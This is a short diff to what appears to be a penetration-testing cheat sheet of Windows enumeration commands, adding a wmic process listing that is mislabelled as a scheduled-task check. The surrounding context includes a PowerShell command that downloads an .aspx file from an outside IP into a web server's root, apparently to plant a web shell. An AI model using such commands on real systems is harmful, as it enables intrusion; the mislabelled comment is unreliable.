@@ -417,6 +417,9 @@ whoami /priv
 # Lists user groups
 whoami /groups
 
+# Check Scheduled Tasks
+wmic process get Name,ProcessId,CreationDate
+
 # Quick PowerShell upload transgfer
 powershell iwr 10.10.16.52/nothinghere.aspx -outfile "C:\inetpub\wwwroot\nothinghere.aspx"
 
